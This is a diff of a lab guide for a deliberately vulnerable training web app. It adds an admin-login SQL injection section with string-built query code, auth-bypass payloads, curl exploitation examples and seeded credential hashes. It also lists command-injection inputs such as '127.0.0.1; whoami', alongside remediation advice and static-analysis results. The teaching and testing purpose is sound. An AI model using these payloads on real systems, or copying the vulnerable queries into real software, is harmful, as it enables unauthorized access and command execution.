@@ -11,6 +11,8 @@ This document describes how the **intentional** flaws in this project can be exe
 | Surface | UI location | HTTP | Vulnerable code |
 |---------|-------------|------|-----------------|
 | SQL injection | **Search portal** | `GET /api/search?q=…` | String-built `LIKE` in [`app/api/search/route.ts`](app/api/search/route.ts) |
+| Login SQLi (auth bypass) | **Archive console** login | `POST /api/admin/login` JSON `{ "username", "password" }` | String-built `WHERE` in [`app/api/admin/login/route.ts`](app/api/admin/login/route.ts) |
+| Admin console (post-auth) | `/admin` | `GET/POST/PUT/DELETE /api/admin/creatures`, `GET /api/admin/users` | Parameterized CRUD; session cookie required |
 | Command injection | **Check planet connectivity** (sidebar) | `POST /api/ping` JSON `{ "target": "…" }` | `exec(\`ping -c 4 ${target}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts) |
 | Safe baseline | Creature grid / chart | `GET /api/creatures` | Parameterized query in [`app/api/creatures/route.ts`](app/api/creatures/route.ts) |
 
@@ -120,7 +122,7 @@ curl -s --get "http://localhost:3000/api/search" \
   | jq '.rows[] | {name, species, home_planet}'
 ```
 
-**What students do with the hashes:** Look up plaintext in [§7](#7-seeded-credentials-post-exfiltration) or crack MD5 offline (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).
+**What students do with the hashes:** Look up plaintext in [§8](#8-seeded-credentials-post-exfiltration) or crack MD5 offline (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).
 
 **4. Optional: list tables (schema enumeration)**
 
@@ -148,7 +150,79 @@ With a single `db.prepare(...).all()` call, SQLite often **rejects** multi-state
 
 ---
 
-## 2. Command injection (`/api/ping`)
+## 2. Admin login SQL injection (`/api/admin/login`)
+
+### How the flaw works
+
+The archive console at **`/admin/login`** authenticates operators with a query built from JSON `username` and `password`:
+
+```typescript
+const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+db.prepare(sql).get();
+```
+
+Both fields are interpolated. A successful row sets the `galactic_admin_session` cookie and unlocks **`/admin`** (creature CRUD + user listing).
+
+Passwords in the DB are **MD5 hex strings**, not plaintext. Legitimate login for the seeded admin:
+
+| Field | Value |
+|-------|--------|
+| Username | `archivist` |
+| Password (form) | `d0ebde9330af602cbaaf3ca6c9b5d34f` (MD5 of `star-chart-7`) |
+
+Students usually reach the console via **SQLi bypass** instead of typing the hash.
+
+On failure, malformed SQL returns `{ "sqlError": "…" }` in the login form (same teaching pattern as search).
+
+### Auth-bypass payloads (login form or API)
+
+| Username | Password | What happens |
+|----------|----------|----------------|
+| `archivist'--` | anything | Comments out `AND password = …` → logs in as **archivist** |
+| `' OR '1'='1'--` | anything | Tautology → first row in `users` (often `agent_kane`) |
+| `archivist' OR '1'='1'--` | anything | Forces archivist row if present |
+
+**Resulting SQL for comment bypass (conceptually):**
+
+```sql
+SELECT * FROM users WHERE username = 'archivist'--' AND password = 'x'
+```
+
+SQLite treats `--` as end-of-line comment; the password clause never runs.
+
+### What the admin console can do (after bypass)
+
+| Action | API |
+|--------|-----|
+| List / add creatures | `GET` / `POST /api/admin/creatures` |
+| Edit / delete creature | `PUT` / `DELETE /api/admin/creatures/:id` |
+| View all users + stored password hashes | `GET /api/admin/users` |
+
+Admin APIs use **parameterized** SQL; the lesson is **authentication** failure, not second-order SQLi in CRUD.
+
+### curl examples
+
+```bash
+# Bypass as archivist
+curl -s -X POST http://localhost:3000/api/admin/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"archivist'\''--","password":"wrong"}' \
+  -c /tmp/admin-cookies.txt | jq
+
+# Use session cookie
+curl -s http://localhost:3000/api/admin/users -b /tmp/admin-cookies.txt | jq
+```
+
+### Remediation talking points
+
+- Never build auth queries with string concatenation; use `WHERE username = ? AND password = ?` with bound values.
+- Compare **password hashes in application code** after fetching by username only (or use a vetted auth library).
+- Use slow password hashes (bcrypt/Argon2), not MD5.
+- Rate-limit and monitor failed logins; enforce MFA for real admin surfaces.
+
+---
+
+## 3. Command injection (`/api/ping`)
 
 ### How the flaw works
 
@@ -248,26 +322,27 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 
 ---
 
-## 3. What is *not* vulnerable here
+## 4. What is *not* vulnerable here
 
 - **`GET /api/creatures`** — prepared statement, safe listing for the grid/chart.
+- **`/api/admin/creatures` and `/api/admin/users`** (after login) — parameterized queries; protected by session cookie only.
 - **Frontend** — React escaping reduces XSS from reflected search results; focus the lab on **server-side** SQL and OS command issues.
-- **Authentication** — there is no login flow; `users` data is reachable via SQLi only.
 
 ---
 
-## 4. Suggested lab flow (45–60 min)
+## 5. Suggested lab flow (45–60 min)
 
 1. **Explore** the UI; confirm 9 seeded creatures and quadrant chart.
 2. **SQLi** — `%` → all; `' OR 1=1--` → all; discuss `sqlError` on malformed input.
-3. **SQLi exfil** — `UNION SELECT` from `users`; crack or look up MD5 from README.
-4. **Command injection** — `127.0.0.1; whoami` then `127.0.0.1; ls -la` (or `pwd`).
-5. **Debrief** — show fixed one-liners (parameterized SQL, `spawn` without shell).
-6. **Reset** — delete `data/galactic.db` and restart `npm run dev` between classes if needed.
+3. **SQLi exfil** — `UNION SELECT` from `users`; note `archivist` and MD5 hashes.
+4. **Login SQLi** — open **Archive console**; bypass with `archivist'--`; add/edit a creature in `/admin`.
+5. **Command injection** — `127.0.0.1; whoami` then `127.0.0.1; ls -la` (or `pwd`).
+6. **Debrief** — parameterized SQL for search *and* login; `spawn` without shell for ping.
+7. **Reset** — delete `data/galactic.db` and restart `npm run dev` between classes if needed.
 
 ---
 
-## 5. Quick reference payloads
+## 6. Quick reference payloads
 
 ### SQLi — Search portal (`?q=`)
 
@@ -277,6 +352,14 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 | `'` | SQL error in UI |
 | `' OR 1=1--` | All 9 creatures (filter bypass) |
 | `' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--` | 5 user rows with MD5 passwords in the grid |
+
+### SQLi — Admin login (`username` / `password` JSON)
+
+| Username | Password | Outcome |
+|----------|----------|---------|
+| `archivist` | `d0ebde9330af602cbaaf3ca6c9b5d34f` | Legitimate admin session |
+| `archivist'--` | `x` | Auth bypass → `/admin` as archivist |
+| `' OR '1'='1'--` | `x` | Auth bypass → first user row |
 
 ### Command injection — Planet connectivity (`target`)
 
@@ -290,18 +373,19 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 
 ---
 
-## 6. Opengrep / SAST
+## 7. Opengrep / SAST
 
 Vulnerable code uses **textbook sinks** (inline template literals):
 
-- SQL: `db.prepare(\`SELECT ... '${q}'\`)` in [`app/api/search/route.ts`](app/api/search/route.ts)
+- SQL search: `db.prepare(\`SELECT ... '${q}'\`)` in [`app/api/search/route.ts`](app/api/search/route.ts)
+- SQL login: `db.prepare(\`SELECT ... '${username}' ... '${password}'\`)` in [`app/api/admin/login/route.ts`](app/api/admin/login/route.ts)
 - Shell: `exec(\`ping -c 4 ${host}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts)
 
 **Scan results (typical):**
 
 | Command | Lab API findings |
 |---------|------------------|
-| `npm run scan:security` (`.opengrep/galactic-lab.yaml`) | **3–4** (SQLi + CMDi) |
+| `npm run scan:security` (`.opengrep/galactic-lab.yaml`) | **4–5** (search SQLi + login SQLi + CMDi) |
 | `npm run scan:community` (cloned semgrep-rules subset) | **0** (Express/Lambda/mysql sinks) |
 | `opengrep scan --config auto app/api/` | **0** (registry rules still miss Next.js + `better-sqlite3`) |
 
@@ -317,7 +401,7 @@ See [README.md](README.md) § Static analysis.
 
 ---
 
-## 7. Seeded credentials (post-exfiltration)
+## 8. Seeded credentials (post-exfiltration)
 
 After UNION, students can verify MD5 hashes:
 
@@ -328,5 +412,6 @@ After UNION, students can verify MD5 hashes:
 | cmd_tess | stellar-ops | d17e5f43b86e142a4c4ecd80903a9cf7 |
 | analyst_rio | deep-core | d2832fa0e6986721e038d8e2dfb4f421 |
 | xenon_7 | xenon-clear | 17ea4c9547edb80f4d2b63b686aa991d |
+| archivist | star-chart-7 | d0ebde9330af602cbaaf3ca6c9b5d34f |
 
 Teaching note: MD5 for passwords is **weak storage**; pair with discussion of bcrypt/Argon2 and salting.
